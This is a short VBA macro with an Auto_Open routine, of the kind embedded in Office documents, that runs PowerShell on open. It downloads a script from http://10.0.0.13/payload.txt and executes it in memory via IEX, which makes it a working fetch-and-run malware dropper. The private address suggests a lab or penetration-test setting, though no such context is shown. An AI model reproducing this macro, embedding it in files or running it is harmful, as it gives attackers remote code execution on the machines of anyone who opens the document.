Sub Auto_Open()
Dim exec As String
exec = "powershell.exe ""IEX ((new-object net.webclient).downloadstring('http://10.0.0.13/payload.txt '))"""
Shell (exec)
End Sub